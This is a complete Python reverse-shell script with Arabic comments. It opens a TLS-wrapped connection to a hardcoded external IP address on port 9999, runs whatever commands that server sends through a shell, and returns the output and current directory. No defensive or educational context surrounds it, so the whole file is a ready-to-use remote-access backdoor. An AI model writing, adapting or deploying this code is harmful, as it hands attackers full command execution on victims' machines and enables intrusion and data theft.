import socket
import ssl  # استيراد مكتبة SSL لتشفير الاتصال
import os
import subprocess
import sys

# إعدادات السيرفر
SERVER_IP = '178.62.237.181'  # استبدلها بعنوان الـ IP للسيرفر
SERVER_PORT = 9999

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))

        # **تطبيق SSL/TLS** على الاتصال
        s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE)

    except Exception as e:
        sys.exit(f"Connection failed: {e}")

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8", errors="ignore")
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    output = ""
                except Exception as e:
                    output = f"Error changing directory: {e}\n"
            else:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout.decode() + stderr.decode()

            cwd = os.getcwd() + "> "
            final_output = output + cwd

            s.send(final_output.encode("utf-8"))
        except Exception as e:
            s.send(f"Error: {e}\n".encode("utf-8"))
            break

    s.close()

if __name__ == '__main__':
    main()
